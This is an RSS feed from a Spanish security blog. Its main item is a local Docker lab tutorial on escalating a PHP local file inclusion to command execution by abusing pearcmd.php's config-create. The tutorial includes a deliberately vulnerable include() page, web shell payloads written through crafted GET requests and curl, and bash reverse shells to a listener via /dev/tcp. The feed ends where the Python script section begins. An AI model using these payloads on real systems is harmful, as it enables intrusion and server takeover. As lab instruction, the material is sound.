<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
	<channel>
		<title>Publicaciones on Trusted Cybersecurity</title>
		<link>http://localhost:1313/es/posts/</link>
		<description>Recent content in Publicaciones on Trusted Cybersecurity</description>
		<generator>Hugo -- gohugo.io</generator>
		<language>es</language>
		<copyright>Maximiliano Belino</copyright>
		<lastBuildDate>Wed, 01 Jan 2025 00:00:00 +0000</lastBuildDate>
		<atom:link href="http://localhost:1313/es/posts/index.xml" rel="self" type="application/rss+xml" />
		
		<item>
			<title>Hack the Box - Informes técnicos</title>
			<link>http://localhost:1313/es/posts/htb/</link>
			<pubDate>Wed, 01 Jan 2025 00:00:00 +0000</pubDate>
			
			<guid>http://localhost:1313/es/posts/htb/</guid>
			<description><![CDATA[Esta página contendrá los Informes que he realizado de las máquinas de HTB]]></description>
			<content type="html"><![CDATA[
Próximamente iré publicando los informes (writeups) de las máquinas ya retiradas de HTB.
]]></content>
		</item>
		
		<item>
			<title>Pwned Labs - Informes técnicos</title>
			<link>http://localhost:1313/es/posts/pwnedlabs/</link>
			<pubDate>Wed, 01 Jan 2025 00:00:00 +0000</pubDate>
			
			<guid>http://localhost:1313/es/posts/pwnedlabs/</guid>
			<description><![CDATA[Esta página contendrá los Informes que he realizado de los labs de Pwned Labs]]></description>
			<content type="html"><![CDATA[
Próximamente!
]]></content>
		</item>
		
		<item>
			<title>Vulnerabilidad en PHP hasta 7.3. LFI to RCE</title>
			<link>http://localhost:1313/es/posts/phplfitorce/</link>
			<pubDate>Wed, 27 Nov 2024 15:23:13 -0300</pubDate>
			
			<guid>http://localhost:1313/es/posts/phplfitorce/</guid>
			<description><![CDATA[LFI to RCE = Local File Inclusion to Remote Command Execution. Based on John Hammond Youtube video.]]></description>
			<content type="html"><![CDATA[<p><em>John Hammond YouTube video <sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup></em></p>
<ul>
<li><a href="/es/posts/phplfitorce/#1-objetivo">1. Objetivo</a></li>
<li><a href="/es/posts/phplfitorce/#2-creando-nuestro-laboratorio-local">2. Creando nuestro Laboratorio Local</a></li>
<li><a href="/es/posts/phplfitorce/#3-variables-argc-y-argv">3. Variables argc y argv</a></li>
<li><a href="/es/posts/phplfitorce/#4-acerca-del-archivo-pearcmdphp">4. Acerca del archivo pearcmd.php</a></li>
<li><a href="/es/posts/phplfitorce/#5-ejecución-de-pearcmdphp">5. Ejecución de pearcmd.php</a></li>
<li><a href="/es/posts/phplfitorce/#6-hacer-un-archivo-de-prueba-php-sin-usar-config-create-que-nos-dé-ejecución-de-comandos">6. Hacer un archivo de prueba .php (sin usar config-create) que nos dé ejecución de comandos</a></li>
<li><a href="/es/posts/phplfitorce/#7-repetimos-y-creamos-el-archivo-ahora-haciendo-uso-del-lfi">7. Repetimos y creamos el archivo ahora haciendo uso del LFI</a></li>
<li><a href="/es/posts/phplfitorce/#8-usemos-un-script-python-en-vez-de-curl-para-crear-el-archivo-php">8. Usemos un script python (en vez de curl) para crear el archivo (.php)</a></li>
</ul>
<h2 id="1-objetivo">1. Objetivo</h2>
<p>Vamos a probar como un LFI (<em>Local File Inclusion</em>) nos llevará a un RCE (<em>Remote Command Execution</em>) vía una vulnerabilidad de PHP.</p>
<p>Básicamente, con el LFI podremos invocar un archivo muy particular de PHP que nos permitirá escribir en el sistema una <em>webshell</em> y luego con esta misma <em>webshell</em> podremos ejecutar comandos de sistema y ganar acceso al mismo.</p>
<p>El problema existe hasta la versión PHP 7.3 y esto fue reportado en el año 2021.</p>

    <aside class="admonition note">
        <div class="admonition-title">
            <div class="icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor"
      stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-edit-2">
      <path d="M17 3a2.828 2.828 0 1 1 4 4L7.5 20.5 2 22l1.5-5.5L17 3z"></path>
   </svg></div><b>Obs</b>
        </div>
        <div class="admonition-content">La página está en otro idioma y John H. la ha traducido con Google al Inglés. Este documento lo he armado en base a su vídeo en YouTube.</div>
    </aside>
<h3 id="11-laboratorio-local">1.1. Laboratorio local</h3>
<p>Crearemos un laboratorio local en el que utilizaremos Docker. La primer prueba es creando la <em>webshell</em> directamente en el contenedor sin usar la &ldquo;vulnerabilidad&rdquo; de <em>php</em> y luego con el LFI demostrar cómo la podemos invocar. Luego sí, hacemos uso de la vulnerabilidad para directamente crear la <em>webshell</em>.</p>
<p>Para hacer las pruebas nos vamos a crear una imagen Docker que cuente con PHP. A partir de esta imagen crearemos un contenedor Docker que contenga una página con un LFI (<em>Local File Inclusion</em>).</p>
<p>Luego, abusaremos de un <em>.php</em> que existe por defecto y es una especie de consola, y según los parámetros que le demos ejecutará distintos comandos, por ejemplo: nos permite crear archivos. Podremos crear archivos con extensión <em>.php</em> que luego al solicitar con el navegador nos permitirá crear una <em>webshell</em>.</p>

    <aside class="admonition note">
        <div class="admonition-title">
            <div class="icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor"
      stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-edit-2">
      <path d="M17 3a2.828 2.828 0 1 1 4 4L7.5 20.5 2 22l1.5-5.5L17 3z"></path>
   </svg></div><b>Obs</b>
        </div>
        <div class="admonition-content">Normalmente usamos técnicas de <em>log poisoning</em> para ir de un LFI a RCE, este no es el caso.</div>
    </aside>
<p><img src="../../../images/phplfitorce.es.png"></p>
<h3 id="12-blog-de-origen">1.2. Blog de origen</h3>
<p>El blog de origen, se ve algo así:</p>
<p><img src="../../../images/phplfitorce.es-1.png"></p>
<p>Blog <sup id="fnref:2"><a href="#fn:2" class="footnote-ref" role="doc-noteref">2</a></sup></p>
<p>Traducción <sup id="fnref:3"><a href="#fn:3" class="footnote-ref" role="doc-noteref">3</a></sup></p>
<p>Sección interesante <sup id="fnref:4"><a href="#fn:4" class="footnote-ref" role="doc-noteref">4</a></sup></p>
<p><img src="../../../images/phplfitorce.es-2.png"></p>
<h4 id="121-autor-en-twitter-x">1.2.1 Autor en twitter (X)</h4>
<p><img src="../../../images/phplfitorce.es-3.png"></p>
<h2 id="2-creando-nuestro-laboratorio-local">2. Creando nuestro Laboratorio Local</h2>
<p>Para poder hacer las pruebas en un laboratorio local necesitamos:</p>
<ul>
<li>Crear un contenedor (Docker)</li>
<li>Crear algunos archivos para testear</li>
</ul>
<h3 id="21-archivos-y-contenedores">2.1. Archivos y contenedores</h3>
<p>Con nuestro <em>Dockerfile</em> crearemos una imagen y a partir de esta crearemos contenedores Docker (con 1 solo nos alcanza).
Nuestra imagen contiene un servidor web PHP básico que escucha en el puerto 8000.</p>
<p><strong>Archivo: Dockerfile</strong></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">FROM php:7.0.0
</span></span><span class="line"><span class="cl">COPY app/* /var/www/html/
</span></span><span class="line"><span class="cl">WORKDIR /var/www/html/
</span></span><span class="line"><span class="cl">CMD <span class="o">[</span><span class="s2">&#34;php&#34;</span>, <span class="s2">&#34;-S&#34;</span>, <span class="s2">&#34;0.0.0.0:8000&#34;</span><span class="o">]</span>
</span></span></code></pre></div><p>En el <em>index.php</em> generamos la vulnerabilidad, usaremos <em>include</em> para poder tener LFI.</p>
<p><strong>Archivo: index.php</strong></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"> <span class="k">if</span> <span class="p">(</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">])</span> <span class="p">){</span>
</span></span><span class="line"><span class="cl">     <span class="k">include</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl"> <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p><strong>Archivo: phpinfo.php</strong></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"> <span class="nx">phpinfo</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>Creamos el dir <strong>app/</strong> y movemos los archivos <em>.php</em> al mismo:
<img src="../../../images/phplfitorce.es-4.png">
Estos 2 archivos son los que serán accesibles en nuestro <em>servidor web php</em>, pero abusando del LFI &ldquo;podremos llegar&rdquo; a otros archivos del sistema.</p>
<h3 id="22-contenedor">2.2. Contenedor</h3>
<h4 id="221-build-de-la-imagen-desde-nuestro-dockerfile">2.2.1. Build de la imagen desde nuestro Dockerfile</h4>
<p>Usaremos el tag = LFi 2 RCE → <strong>phplfi2rce</strong></p>
<pre tabindex="0"><code>docker build -t phplfi2rce .
</code></pre><p>(hay un punto al final del comando indicando el directorio actual)</p>
<p>Hacemos el build de la imagen:</p>
<p><img src="../../../images/phplfitorce.es-5.png"></p>
<p>Si ahora listamos las imágenes Docker disponibles localmente veremos la que hemos creado:</p>
<pre tabindex="0"><code>docker images
</code></pre><p><img src="../../../images/phplfitorce.es-6.png"></p>
<h4 id="222-iniciamos-un-contenedor-usando-la-imagen-que-hemos-creado">2.2.2. Iniciamos un contenedor usando la imagen que hemos creado</h4>
<p>Para iniciar un nuevo contenedor desde la imagen &ldquo;phplfi2rce&rdquo; ejecutamos:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">docker run -p 8000:8000 phplfi2rce
</span></span></code></pre></div><p>(el puerto 8000 lo estamos mapeando en el mismo puerto 8000 del contenedor, donde escucha el <em>servidor web php</em>)</p>
<h4 id="223-probamos-el-servicio-en-el-puerto-8000">2.2.3. Probamos el servicio en el puerto 8000</h4>
<p>Visitamos nuestra página vulnerable <em>index.php</em></p>
<p><img src="../../../images/phplfitorce.es-7.png"></p>
<h4 id="224-comprobamos-el-lfi">2.2.4. Comprobamos el LFI</h4>
<p>Probamos el <em>Local File Inclusion</em> con el archivo <em>/etc/passwd</em></p>
<p>URL:</p>
<pre tabindex="0"><code>http://127.0.0.1:8000/index.php?file=/etc/passwd
</code></pre><p>O lo que es lo mismo:</p>
<pre tabindex="0"><code>http://localhost:8000/?file=/etc/passwd
</code></pre><p><img src="../../../images/phplfitorce.es-8.png"></p>
<p>En la consola vemos los <em>requests</em>:</p>
<p><img src="../../../images/phplfitorce.es-9.png"></p>
<h4 id="225-accedemos-al-phpinfophp">2.2.5. Accedemos al phpinfo.php</h4>
<p>Uno de los archivos que habíamos copiado al contenedor es el <em>phpinfo.php</em>, es decir está accesible en la raíz del servidor web.</p>
<p>Visitemos la página del <em>phpinfo.php</em>.</p>
<pre tabindex="0"><code>http://localhost:8000/phpinfo.php
</code></pre><p><img src="../../../images/phplfitorce.es-10.png"></p>
<h2 id="3-variables-argc-y-argv">3. Variables argc y argv</h2>
<p>En la página del <em>phpinfo.php</em>, busquemos por las variables que hace referencia el blog (argc y argv)</p>
<p><strong>argc</strong> → contar argumentos</p>
<p><strong>argv</strong> → valores de los argumentos</p>
<p><img src="../../../images/phplfitorce.es-11.png"></p>
<p>La siguiente es un <em>array</em>:</p>
<p><img src="../../../images/phplfitorce.es-12.png"></p>
<p>Si en la URL le pasamos después del signo de pregunta &lsquo;?&rsquo; un texto como &ldquo;<em>cualquiercosa</em>&rdquo; lo veremos reflejado en el <em>array</em>.</p>
<p><img src="../../../images/phplfitorce.es-13.png"></p>
<p>Esta es la petición que llega al <em>servidor web php</em> en el contenedor:</p>
<p><img src="../../../images/phplfitorce.es-14.png"></p>
<h3 id="31-qué-ha-sucedido">3.1. Qué ha sucedido</h3>
<p>El blog (traducido al inglés y acá al español) explica lo siguiente:</p>
<blockquote>
<p>Si en la URL ponemos un texto, lo vemos reflejado en la página del <em>phpinfo</em>, es decir el texto que escribimos se está cargando en el contenido del array $_SERVER[&lsquo;argv&rsquo;].</p>
</blockquote>

    <aside class="admonition tip">
        <div class="admonition-title">
            <div class="icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor"
      stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-sun">
      <circle cx="12" cy="12" r="5"></circle>
      <line x1="12" y1="1" x2="12" y2="3"></line>
      <line x1="12" y1="21" x2="12" y2="23"></line>
      <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
      <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
      <line x1="1" y1="12" x2="3" y2="12"></line>
      <line x1="21" y1="12" x2="23" y2="12"></line>
      <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
      <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
   </svg></div><b>Eso significa que:</b>
        </div>
        <div class="admonition-content">&ldquo;hemos visitado la función del <em>pearcmd.php</em> a través de la web y hemos sido capaces de controlar los parámetros enviados a la línea de comandos.&rdquo;</div>
    </aside>
<h2 id="4-acerca-del-archivo-pearcmdphp">4. Acerca del archivo pearcmd.php</h2>
<h3 id="41-cuál-es-la-idea">4.1. Cuál es la idea</h3>

    <aside class="admonition note">
        <div class="admonition-title">
            <div class="icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor"
      stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-edit-2">
      <path d="M17 3a2.828 2.828 0 1 1 4 4L7.5 20.5 2 22l1.5-5.5L17 3z"></path>
   </svg></div><b>Obs</b>
        </div>
        <div class="admonition-content">Una vez más, leer lo anterior, donde dice &ldquo;Qué ha sucedido&rdquo;.</div>
    </aside>
<p><code>pearcmd.php</code> es un archivo relacionado con PEAR (PHP Extension and Application Repository), una herramienta de línea de comandos utilizada para manejar extensiones y librerías en PHP.</p>
<p>Si hacemos LFI de ese archivo <em>pearcmd.php</em> se invocará, es decir, se va a interpretar, pues tiene extensión <em>php</em>; y lo interesante es que a ese archivo le podemos pasar una lista de argumentos (de los que tiene &ldquo;habilitados&rdquo; el archivo), que podremos controlar a través del <em>output</em> que vemos en el <em>array</em> visto en el <em>phpinfo</em>.</p>

    <aside class="admonition success">
        <div class="admonition-title">
            <div class="icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor"
      stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-check-circle">
      <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path>
      <polyline points="22 4 12 14.01 9 11.01"></polyline>
   </svg></div><b></b>
        </div>
        <div class="admonition-content">Al escribir la salida del <em>array</em> (que vemos en el <em>phpinfo</em>) estamos escribiendo o eligiendo los argumentos que va a tomar el <em>pearcmd.php</em>.</div>
    </aside>
<p>Info de ChatGPT:</p>
<blockquote>
<p><code>pearcmd.php</code> está diseñado para usarse en CLI, donde los argumentos se pasan desde la línea de comandos.
Al cargarse mediante LFI, <strong>PHP trata los parámetros de la URL como si fueran argumentos CLI</strong>, asignándolos a <code>$_SERVER['argv']</code>.</p>
</blockquote>
<p>El archivo <em>pearcmd.php</em> está en la ruta: <em>/usr/local/lib/php</em></p>
<p>Desde <strong>consola</strong>, se invoca ejecutando:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">php /usr/local/lib/pearcmd.php
</span></span></code></pre></div><h3 id="42-veamos-el-archivo-desde-dentro-del-contenedor">4.2. Veamos el archivo desde dentro del contenedor</h3>
<h4 id="421-entramos-al-contenedor">4.2.1. Entramos al contenedor</h4>
<p>Primero obtenemos el ID del contenedor</p>
<p><img src="../../../images/phplfitorce.es-15.png">
Ahora sí, entramos al contenedor:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">docker <span class="nb">exec</span> -it &lt;ID&gt; /bin/bash
</span></span></code></pre></div><p><img src="../../../images/phplfitorce.es-16.png"></p>
<p>Ya dentro del contenedor, listamos el directorio:</p>
<p><img src="../../../images/phplfitorce.es-17.png"></p>
<h4 id="422-comandos-que-puede-ejecutar-el-pearcmdphp">4.2.2. Comandos que puede ejecutar el pearcmd.php</h4>
<p>A este <em>php</em> lo podemos invocar usando el comando:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">php &lt;ruta al archivo pearcmd.php&gt;
</span></span></code></pre></div><p>La salida es la lista de comandos/argumentos que puede tomar:</p>
<p><img src="../../../images/phplfitorce.es-18.png"></p>
<p>Observar esta opción en particular:</p>
<p><img src="../../../images/phplfitorce.es-19.png"></p>
<h4 id="423-código-fuente-del-pearcmdphp">4.2.3. Código fuente del <em>pearcmd.php</em></h4>
<p>Nos copiamos el código fuente del archivo <em>pearcmd.php</em></p>
<p><img src="../../../images/phplfitorce.es-20.png"></p>
<h4 id="424-análisis-del-config-create">4.2.4. Análisis del <em>config-create</em></h4>
<p>El autor del blog analiza el código del <em>config-create</em> y dice:</p>
<p><img src="../../../images/phplfitorce.es-21.png"></p>
<p>El <strong>config-create</strong> necesita de 2 argumentos o parámetros:</p>
<ul>
<li>
<p>el segundo parámetro es el nombre del archivo con el <em>file path</em> que se va a escribir (llamémosle &ldquo;pepe&rdquo;, entonces /file/path/a/pepe)</p>
</li>
<li>
<p>el primer parámetro será el contenido de lo que se escribe dentro del archivo &ldquo;pepe&rdquo;. Es decir, a través de <em>pearcmd.php</em> podemos crear un nuevo archivo (por ejemplo con extensión .php) con el contenido que queramos.</p>
</li>
</ul>
<h2 id="5-ejecución-de-pearcmdphp">5. Ejecución de pearcmd.php</h2>
<p>En el blog, el autor usa un HTTP GET para realizar el <em>request</em> (John H. crea con este código un <em>request</em> en Python).</p>
<p>Tenemos que usar el parámetro <strong>file</strong> que es el con el que tenemos LFI y los dos parámetros que necesita <em>&ldquo;config-create</em>&rdquo;:</p>
<p><img src="../../../images/phplfitorce.es-22.png"></p>
<ol>
<li>
<p>El LFI invoca a través de &ldquo;file&rdquo; al <em>pearcmd.php</em></p>
</li>
<li>
<p>Subrayado en rojo el contenido a escribir</p>
</li>
<li>
<p>Subrayado en celeste el archivo de salida.</p>
</li>
</ol>
<h3 id="51-opción-1---utilizar-el-navegador-para-hacer-el-request-y-crear-un-archivo-dentro-del-contenedor">5.1. Opción 1 - Utilizar el navegador para hacer el request y crear un archivo dentro del contenedor</h3>
<p>Crearemos un archivo .php dentro del contenedor.</p>
<p>La URL a visitar es:</p>
<pre tabindex="0"><code>http://127.0.0.1:8000/index.php?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=phpinfo()?&gt;+/tmp/hello.php
</code></pre><p><img src="../../../images/phplfitorce.es-23.png"></p>
<p>El mensaje es de éxito.</p>
<p>Verificamos si se creó el archivo en el /tmp/hello.php dentro del contenedor:</p>
<p><img src="../../../images/phplfitorce.es-24.png">
→ ok, tenemos el archivo <em>hello.php</em> dentro del contenedor</p>
<p>Veamos el contenido:</p>
<p><img src="../../../images/phplfitorce.es-25.png"></p>
<h2 id="6-hacer-un-archivo-de-prueba-php-sin-usar-config-create-que-nos-dé-ejecución-de-comandos">6. Hacer un archivo de prueba .php (sin usar config-create) que nos dé ejecución de comandos</h2>
<p>Vamos a hacer una primera prueba que es crear el archivo <em>test.php</em> directamente en el directorio /tmp/ del contenedor:</p>
<ol>
<li>
<p><strong>estando en una consola del contenedor</strong></p>
</li>
<li>
<p><strong>sin usar</strong> el config-create del pearcmd.php</p>
</li>
</ol>
<p>Entonces:</p>
<p>Creamos el archivo <em>test.php</em> que ejecuta el comando ls.</p>
<p>En el contenedor, ejecutamos:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;&lt;?php system(&#39;ls -l&#39;) ?&gt;&#34;</span> &gt; test.php
</span></span></code></pre></div><p><img src="../../../images/phplfitorce.es-26.png"></p>
<p>Visitamos la página:</p>
<p><img src="../../../images/phplfitorce.es-27.png"></p>
<p>→ ok, se ejecutó el &rsquo;ls&rsquo;</p>
<h3 id="61-comandos-de-sistema">6.1. Comandos de sistema</h3>
<p>Creamos el archivo <em>test.php</em> que ejecuta cualquier comando de sistema a través de una variable &lsquo;c&rsquo;</p>
<p>En el contenedor, ejecutamos:</p>
<pre tabindex="0"><code>echo &#34;&lt;?php system(\$_GET[&#39;c&#39;]) ?&gt;&#34;&gt; test.php
</code></pre><p>Obs: hay que escapar el símbolo de pesos con una contrabarra (<em>backslash</em>).</p>
<p><img src="../../../images/phplfitorce.es-28.png"></p>
<p>Ahora hacemos uso del LFI, invocamos al archivo <em>test.php</em>, y a &lsquo;c&rsquo; le damos el valor &lsquo;id&rsquo;:</p>
<pre tabindex="0"><code>index.php?file=/tmp/test.php&amp;c=id
</code></pre><p><img src="../../../images/phplfitorce.es-29.png"></p>
<blockquote>
<p>→ ok, obtenemos el resultado de ejecutar el comando &lsquo;id&rsquo;</p>
</blockquote>
<h3 id="62-reverse-shell">6.2. Reverse shell</h3>
<p>Con lo anterior podemos ejecutar una <em>reverse shell</em> (usando la variable &lsquo;c&rsquo; que espera el archivo <em><strong>test.php</strong></em>)</p>
<p>En Kali abrimos un <em>listener</em> con <em>nc</em>, y luego la URL a visitar en el navegador es:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">http://127.0.0.1:8000/index.php?file<span class="o">=</span>/tmp/test.php<span class="p">&amp;</span><span class="nv">c</span><span class="o">=</span>bash -c <span class="se">\&#34;</span>bash -i&gt;%26 /dev/tcp/172.17.0.1/443 0&gt;%261<span class="s2">&#34;
</span></span></span></code></pre></div><p><img src="../../../images/phplfitorce.es-30.png">
Vemos en la imagen anterior que recibimos una conexión entrante en el <em>listener</em>.</p>
<p>Estamos en el contenedor:</p>
<p><img src="../../../images/phplfitorce.es-31.png"></p>
<h2 id="7-repetimos-y-creamos-el-archivo-ahora-haciendo-uso-del-lfi">7. Repetimos y creamos el archivo ahora haciendo uso del LFI</h2>
<p>Crearemos el archivo en el contenedor usando el LFI que invocará a <em>config-create</em> de <em>pearcmd.php</em>.</p>
<p>Es decir, ahora queremos hacer lo mismo que hicimos antes, pero:</p>
<ol>
<li>
<p>Utilizando el <em>config-create</em> del <em>pearcmd.php</em></p>
</li>
<li>
<p>Haciendo un <em>request</em> HTTP (originado fuera del contenedor)</p>
</li>
</ol>
<p>Ahora vamos a escribir un archivo llamado <em>test2.php</em>.</p>
<p>Tenemos que escribir la cadena:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> <span class="nx">system</span><span class="p">(</span><span class="nx">\</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])</span> <span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>en el archivo <em>test2.php</em></p>

    <aside class="admonition warning">
        <div class="admonition-title">
            <div class="icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor"
      stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-alert-circle">
      <circle cx="12" cy="12" r="10"></circle>
      <line x1="12" y1="8" x2="12" y2="12"></line>
      <line x1="12" y1="16" x2="12.01" y2="16"></line>
   </svg></div><b>!!</b>
        </div>
        <div class="admonition-content">Si queremos usar el navegador para crear el archivo es posible que nos dé problemas: FAIL</div>
    </aside>
<p>Al mandarlo vía la URL del navegador se nos complica, porque los signos de mayor y menor los convierte a código url.</p>
<p>Hice algunos intentos:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">http://127.0.0.1:8000/index.php?+config-create+/<span class="p">&amp;</span><span class="nv">file</span><span class="o">=</span>/usr/local/lib/php/pearcmd.php<span class="p">&amp;</span>/<span class="se">\&lt;</span>?<span class="o">=</span>system<span class="o">(</span><span class="se">\$\_</span>GET<span class="se">\[\&#39;</span>c<span class="se">\&#39;\]</span><span class="o">)</span>?<span class="se">\&gt;</span>+/tmp/test2.php
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">http://127.0.0.1:8000/index.php?+config-create+/<span class="p">&amp;</span><span class="nv">file</span><span class="o">=</span>/usr/local/lib/php/pearcmd.php<span class="p">&amp;</span>/<span class="se">\&lt;</span>?<span class="o">=</span>system<span class="o">(</span>id<span class="o">)</span><span class="p">;</span>?<span class="se">\&gt;</span>+/tmp/test2.php
</span></span></code></pre></div><p>En el log del servidor web del contenedor, vemos que los símbolos no llegan de forma correcta:</p>
<p><img src="../../../images/phplfitorce.es-32.png"></p>
<h3 id="71-usaremos-curl-para-hacer-el-request-y-crear-el-archivo">7.1. Usaremos curl para hacer el request y crear el archivo</h3>
<p>En vez de usar el navegador para visitar la URL con el LFI y en la que usamos <em>config-create</em> para crear el archivo, usemos el comando <em>curl</em> (con el método GET).</p>
<h4 id="711-primer-test-ejecución-del-comando-id">7.1.1. Primer test, ejecución del comando &lsquo;id&rsquo;</h4>
<p>Creamos un archivo <em>test2.php</em> que contiene código <em>php</em> y ejecuta el comando &lsquo;id&rsquo;:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl -s -X GET <span class="s1">&#39;http://127.0.0.1:8000/index.php?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=system(id);?&gt;+/tmp/test2.php&#39;</span>
</span></span></code></pre></div><p><img src="../../../images/phplfitorce.es-33.png"></p>
<p><img src="../../../images/phplfitorce.es-34.png"></p>
<p><img src="../../../images/phplfitorce.es-35.png"></p>
<p>→ Nos dice que se creó al archivo <em>/tmp/test2.php</em></p>
<p>En el <em>log</em>, vemos que llega bien (el <em>request</em>, la cadena de texto) al <em>servidor web php</em> del contenedor:</p>
<p><img src="../../../images/phplfitorce.es-36.png"></p>
<p>Y si luego solicitamos la URL con el navegador usando <em>file=/tmp/test2.php</em> vemos que se ejecuta de forma correcta y nos da la salida del comando &lsquo;id&rsquo; tal como esperábamos:</p>
<p><img src="../../../images/phplfitorce.es-37.png"></p>
<h4 id="712-hagamos-un-nuevo-archivo-con-parámetro-c">7.1.2. Hagamos un nuevo archivo con parámetro &lsquo;c&rsquo;</h4>
<p>Podríamos crear el <em>test2.php</em> con el código necesario de una <em>web shell</em>, usando <em>curl</em>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl -s -X GET <span class="s1">&#39;http://127.0.0.1:8000/index.php?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=system($_GET\[&#34;c&#34;\])?&gt;+/tmp/test2.php&#39;</span>
</span></span></code></pre></div><p><img src="../../../images/phplfitorce.es-38.png"></p>
<p>Observar que se deben escapar los paréntesis rectos, y además intercambiar las comillas, afuera ponemos las simples y en el <strong>GET</strong> las dobles.</p>
<p>El <em>log</em> del web server en el contenedor:</p>
<p><img src="../../../images/phplfitorce.es-39.png"></p>
<h5 id="7121-ejecución-de-comandos">7.1.2.1. Ejecución de comandos</h5>
<p>Mediante el LFI, al igual que antes, llamaremos al archivo <em>.php</em> que ya creamos y le daremos en el parámetro &lsquo;c&rsquo; el comando de sistema a ejecutar.</p>
<p><strong>Comando &lsquo;whoami&rsquo;</strong></p>
<p><img src="../../../images/phplfitorce.es-40.png"></p>
<p>→ ok, hemos ejecutado el comando <em>&lsquo;whoami&rsquo;</em> de forma correcta</p>
<p><strong>Comando &lsquo;id&rsquo;</strong></p>
<p><img src="../../../images/phplfitorce.es-41.png"></p>
<h5 id="7122-reverse-shell">7.1.2.2. Reverse shell</h5>
<p>Ya tenemos el archivo <em>test2.php</em> que mediante la variable &lsquo;c&rsquo; ejecutará un comando de sistema.</p>
<p>Como comando de sistema ahora podemos incluir el código necesario para que nos devuelva una <em>reverse shell</em>.</p>
<p>En vez de usar el navegador, podemos llamar usar <em>wget:</em></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">wget <span class="s1">&#39;http://127.0.0.1:8000/index.php?file=/tmp/test2.php&amp;c=bash -c &#34;bash -i &gt;%26 /dev/tcp/172.17.0.1/443 0&gt;%261&#34;&#39;</span>
</span></span></code></pre></div><p>Al ejecutar el wget:</p>
<p><img src="../../../images/phplfitorce.es-42.png"></p>
<p>En el <em>listener</em> recibimos la conexión desde nuestro contenedor de pruebas:</p>
<p><img src="../../../images/phplfitorce.es-43.png"></p>
<p>Ya dentro del contenedor podemos realizar el análisis que queramos.</p>
<p><img src="../../../images/phplfitorce.es-44.png"></p>
<h2 id="8-usemos-un-script-python-en-vez-de-curl-para-crear-el-archivo-php">8. Usemos un script python (en vez de curl) para crear el archivo (.php)</h2>
<p>La idea es crear un script en Python (<em>hack.py</em>) para hacer el GET request y así crear el archivo de extensión <em>.php</em> (al que luego podremos llamar mediante el LFI).</p>
<p>Tomaremos el código sugerido en el blog y le consultamos a Chat GPT cómo hacer el <em>request</em> en Python:</p>
<p><img src="../../../images/phplfitorce.es-45.png"></p>
